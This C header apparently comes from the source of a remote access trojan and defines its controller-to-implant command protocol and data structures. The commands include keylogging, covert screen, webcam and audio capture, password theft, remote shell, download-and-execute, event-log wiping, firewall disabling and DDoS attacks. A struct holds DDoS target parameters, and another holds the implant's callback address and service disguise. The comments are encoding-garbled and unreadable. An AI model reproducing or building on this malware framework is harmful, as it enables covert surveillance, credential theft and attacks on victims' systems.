
#if !defined(AFX_MACROS_H_INCLUDED)
#define AFX_MACROS_H_INCLUDED

// BYTE���Ҳ��256
enum
{
	// �ļ����䷽ʽ
	TRANSFER_MODE_NORMAL = 0x00,	// һ��,������ػ���Զ���Ѿ��У�ȡ��
	TRANSFER_MODE_ADDITION,			// ׷��
	TRANSFER_MODE_ADDITION_ALL,		// ȫ��׷��
	TRANSFER_MODE_OVERWRITE,		// ����
	TRANSFER_MODE_OVERWRITE_ALL,	// ȫ������
	TRANSFER_MODE_JUMP,				// ����
	TRANSFER_MODE_JUMP_ALL,			// ȫ������
	TRANSFER_MODE_CANCEL,			// ȡ������
	
	// ���ƶ˷���������
	COMMAND_ACTIVED = 0x00,			// ����˿��Լ��ʼ����
	COMMAND_LIST_DRIVE,				// �г�����Ŀ¼
	COMMAND_LIST_FILES,				// �г�Ŀ¼�е��ļ�
	COMMAND_DOWN_FILES,				// �����ļ�
	COMMAND_FILE_SIZE,				// �ϴ�ʱ���ļ���С
	COMMAND_FILE_DATA,				// �ϴ�ʱ���ļ�����
	COMMAND_EXCEPTION,				// ���䷢���쳣����Ҫ���´���
	COMMAND_CONTINUE,				// �������������������������
	COMMAND_STOP,					// ������ֹ
	COMMAND_DELETE_FILE,			// ɾ���ļ�
	COMMAND_DELETE_DIRECTORY,		// ɾ��Ŀ¼
	COMMAND_SET_TRANSFER_MODE,		// ���ô��䷽ʽ
	COMMAND_CREATE_FOLDER,			// �����ļ���
	COMMAND_RENAME_FILE,			// �ļ����ļ�����
	COMMAND_OPEN_FILE_SHOW,			// ��ʾ���ļ�
	COMMAND_OPEN_FILE_HIDE,			// ���ش��ļ�
	
	COMMAND_SCREEN_SPY,				// ��Ļ�鿴
	COMMAND_SCREEN_RESET,			// �ı���Ļ���
	COMMAND_ALGORITHM_RESET,		// �ı��㷨
	COMMAND_SCREEN_CTRL_ALT_DEL,	// ����Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// ��Ļ����
	COMMAND_SCREEN_BLOCK_INPUT,		// ��������˼����������
	COMMAND_SCREEN_BLANK,			// ����˺���
	COMMAND_SCREEN_CAPTURE_LAYER,	// ��׽��
	COMMAND_SCREEN_GET_CLIPBOARD,	// ��ȡԶ�̼�����
	COMMAND_SCREEN_SET_CLIPBOARD,	// ����Զ�̼�����

	COMMAND_WEBCAM,					// ����ͷ
	COMMAND_WEBCAM_ENABLECOMPRESS,	// ����ͷ����Ҫ�󾭹�H263ѹ��
	COMMAND_WEBCAM_DISABLECOMPRESS,	// ����ͷ����Ҫ��ԭʼ����ģʽ
	COMMAND_WEBCAM_RESIZE,			// ����ͷ�����ֱ��ʣ����������INT�͵Ŀ��
	COMMAND_NEXT,					// ��һ��(���ƶ��Ѿ��򿪶Ի���)

	COMMAND_KEYBOARD,				// ���̼�¼
	COMMAND_KEYBOARD_OFFLINE,		// �������߼��̼�¼
	COMMAND_KEYBOARD_CLEAR,			// ������̼�¼����

	COMMAND_AUDIO,					// ��������

	COMMAND_SYSTEM,					// ϵͳ�������̣�����....��
	COMMAND_PSLIST,					// �����б�
	COMMAND_WSLIST,					// �����б�
	COMMAND_DIALUPASS,				// ��������
	COMMAND_KILLPROCESS,			// �رս���
	COMMAND_SHELL,					// cmdshell
	COMMAND_SESSION,				// �Ự�����ػ���������ע��, ж�أ�
	COMMAND_REMOVE,					// ж�غ���
	COMMAND_DOWN_EXEC,				// �������� - ����ִ��
	COMMAND_UPDATE_SERVER,			// �������� - ���ظ���
	COMMAND_CLEAN_EVENT,			// �������� - ���ϵͳ��־
	COMMAND_CLEAN_System,			// �������� - ���ϵͳ��־
	COMMAND_CLEAN_Security,			// �������� - ���ϵͳ��־
	COMMAND_CLEAN_Application,		// �������� - ���ϵͳ��־
	COMMAND_OPEN_URL_HIDE,			// �������� - ���ش���ҳ
	COMMAND_OPEN_URL_SHOW,			// �������� - ��ʾ����ҳ
	COMMAND_RENAME_REMARK,			// ��������ע
	COMMAND_REPLAY_HEARTBEAT,		// �ظ�������
	COMMAND_CHANGE_GROUP,			// ���ķ���

	COMMAND_SYSINFO,                //��������Ϣ
	COMMAND_SEND_SYSINFO,			//��ȡ��������Ϣ
	COMMAND_NET_USER,				//��net����û�
	COMMAND_GUEST,                  //����GUEST
	COMMAND_STOPFIRE,               //�رշ���ǽ
	COMMAND_CHANGE_PORT,            //�����ն˶˿�
	COMMAND_OPEN_PROXY,				//����
	COMMAND_CLOSE_3389,				//�ر�3389
	COMMAND_OPEN_3389,				//����3389
	COMMAND_DLL_3389,				//���Դ���3389dll
	COMMAND_START_MAP,				//����ӳ��
	COMMAND_CLOSE_PORT,				//�ر�ӳ��
	COMMAND_SLIST,					//��ȡϵͳ�û�
	COMMAND_DELUSER,				//ɾ���û�
	COMMAND_NET_CHANGE_PASS,		//�����û�����
	COMMAND_WTSLIST,				//�����û�
	COMMAND_WTS_Logoff,			    //ע���û�
	COMMAND_WTS_Disconnect,			//�Ͽ��û�
	COMMAND_DISABLEEUSER,
	COMMAND_ACITVEUSER,

	COMMAND_REGEDIT,                //ע������
	COMMAND_REG_FIND,               //��ѯ����  
	COMMAND_REG_DELPATH,            //ɾ����
	COMMAND_REG_CREATEPATH,         //������
	COMMAND_REG_DELKEY,             //ɾ����
    COMMAND_REG_CREATKEY,           //������

	COMMAND_DDOS_ATTACK,            // DDOS
	COMMAND_DDOS_STOP,              // STOP

	COMMAND_SORT_PROCESS,			// ɸѡ����
	COMMAND_SORT_WINDOW,			// ɸѡ����
	
	TOKEN_INFO_YES,					// ɸѡ
	TOKEN_INFO_NO,					// ɸѡ	

	// ����˷����ı�ʶ
	TOKEN_AUTH = 100,				// Ҫ����֤
	TOKEN_HEARTBEAT,				// ������
	TOKEN_LOGIN,					// ���߰�
	TOKEN_DRIVE_LIST,				// �������б�
	TOKEN_FILE_LIST,				// �ļ��б�
	TOKEN_FILE_SIZE,				// �ļ���С�������ļ�ʱ��
	TOKEN_FILE_DATA,				// �ļ�����
	TOKEN_TRANSFER_FINISH,			// �������
	TOKEN_DELETE_FINISH,			// ɾ�����
	TOKEN_GET_TRANSFER_MODE,		// �õ��ļ����䷽ʽ
	TOKEN_GET_FILEDATA,				// Զ�̵õ������ļ�����
	TOKEN_CREATEFOLDER_FINISH,		// �����ļ����������
	TOKEN_DATA_CONTINUE,			// ������������
	TOKEN_RENAME_FINISH,			// �����������
	TOKEN_EXCEPTION,				// ���������쳣
	
	TOKEN_BITMAPINFO,				// ��Ļ�鿴��BITMAPINFO
	TOKEN_FIRSTSCREEN,				// ��Ļ�鿴�ĵ�һ��ͼ
	TOKEN_NEXTSCREEN,				// ��Ļ�鿴����һ��ͼ
	TOKEN_CLIPBOARD_TEXT,			// ��Ļ�鿴ʱ���ͼ���������

	TOKEN_WEBCAM_BITMAPINFO,		// ����ͷ��BITMAPINFOHEADER
	TOKEN_WEBCAM_DIB,				// ����ͷ��ͼ������
	
	TOKEN_AUDIO_START,				// ��ʼ��������
	TOKEN_AUDIO_DATA,				// ������������

	TOKEN_KEYBOARD_START,			// ���̼�¼��ʼ
	TOKEN_KEYBOARD_DATA,			// ���̼�¼������
	
	TOKEN_SYSINFOLIST,              // ��Ϣ�б�
	TOKEN_ADD_SUCCESS,				// ��ӳɹ�
	TOKEN_ADD_ERROR,				// ���ʧ��
	TOKEN_DEL_SUCCESS,				// ɾ���û��ɹ�
	TOKEN_DEL_ERROR,				// ɾ���û�ʧ��
	TOKEN_CHANGE_PSAA_SUCCESS,		// �޸�����ɹ�
	TOKEN_CHANGE_PSAA_ERROR,		// �޸�����ʧ��
	TOKEN_DLL_3389,					// ����3389ʧ��
	TOKEN_SLIST,					// ö��ϵͳ�û�
	TOKEN_WTSLIST,					// ö�������û�
	TOKEN_STATE_SUCCESS,			// �����û�״̬�ɹ�
	TOKEN_STATE_ERROR,				// �����û�״̬ʧ��
	TOKEN_PSLIST,					// �����б�
	TOKEN_WSLIST,					// �����б�
	TOKEN_DIALUPASS,				// ��������
	TOKEN_SHELL_START,				// Զ���ն˿�ʼ

	TOKEN_REGEDIT,                  // ��ע������
    TOKEN_REG_PATH,                 // ����ע�������
	TOKEN_REG_KEY,                  // ���ͼ���
	TOKEN_REG_OK,                   // ִ�гɹ�
	TOKEN_REG_NO,                   // ִ��ʧ��

	COMMAND_DLLVERSION,				// DLL VERSION
	COMMAND_DLLERROR,				// DLL ERROR 
	COMMAND_DLLMAIN,				// DLL MAIN
	COMMAND_DLLOK,					// ���Լ���DLL

	TOKEN_DLLVERSION,				// ��ȡDLL�İ汾
	TOKEN_DLLLOADERROR,				// �������ʧ��
	TOKEN_DLLMAIN,					// DLLMAIN
	TOKEN_DLLOK
};

//��Ϣ�б�ṹ��
struct tagSystemInfo
{
	TCHAR szCpuInfo[128];   //CPU��Ϣ
	TCHAR szActiveTime[32]; //�ʱ��
	TCHAR szAntiVirus[128]; //ɱ�����
	TCHAR szUserName[32];   //�û���
	TCHAR szRemotePort[32]; //Զ�̶˿�
	DWORD szMemory;         //�ڴ��С 
	DWORD szMemoryFree;     //�����ڴ� 
	DWORD szDriveSize;      //Ӳ�̴�С
	DWORD szDriveFreeSize;  //����Ӳ�̴�С
	TCHAR szOpenInfo[64];	// �Ƿ�˫��(�Ƿ���)
};

typedef struct
{	
	BYTE			bToken;			// = 1
	OSVERSIONINFOEX	OsVerInfoEx;	// �汾��Ϣ
	int				CPUClockMhz;	// CPU��Ƶ
	char			CPUNumber[20];	// CPU����
	DWORD			MemSize;		// �ڴ��С
	IN_ADDR			IPAddress;		// �洢32λ��IPv4�ĵ�ַ���ݽṹ
	char			HostName[50];	// ������
	bool			bIsWebCam;		// �Ƿ�������ͷ
	DWORD			dwSpeed;		// ����
	char			UpGroup[32];	// ���߷���
	char			szVersion[32];	// ���߰汾
}LOGININFO;

struct MODIFY_DATA
{
	TCHAR szDns[300];		//���ߵ�ַ
	TCHAR szGroup[50];		//���߷���
	TCHAR SerName[100];		//��������
	TCHAR Serdisplay[128];	//��ʾ����
	TCHAR Serdesc[256];		//��������
	TCHAR szGetGroup[256];	//����Ψһ��ʶ
	TCHAR szVersion[256];	//�汾��Ϣ
	BOOL  bServer;			//�Ƿ�������
	BOOL  bRuns;			//��д������
	BOOL  bRunOnce;			//�Ƿ�Ϊ��ɫ��װ
};

typedef struct MyTcpKeepAlive   
{   
    DWORD onoff;   
    DWORD keepalivetime;   
    DWORD keepaliveinterval;   
}TCP_KEEP_ALIVE;

typedef struct DDOS_HEAD
{
	CHAR Target[500];    //����Ŀ��
	CHAR DNSTarget[500];    //DNS������DNS��ַ
	int AttackPort;     //�����˿�
	int AttackType;     //��������
	int AttackThread;   //�����߳�
	int AttackTime;     //����ʱ��
	int ExtendData1;   //��������
	int ExtendData2;   //��������
	CHAR DDOSType[500];    //��������
}DATTACK,*LPATTACK;

#define	MAX_WRITE_RETRY			15 // ����д���ļ�����
#define	MAX_SEND_BUFFER			1024 * 8 // ��������ݳ���
#define MAX_RECV_BUFFER			1024 * 8 // ���������ݳ���

#endif // !defined(AFX_MACROS_H_INCLUDED)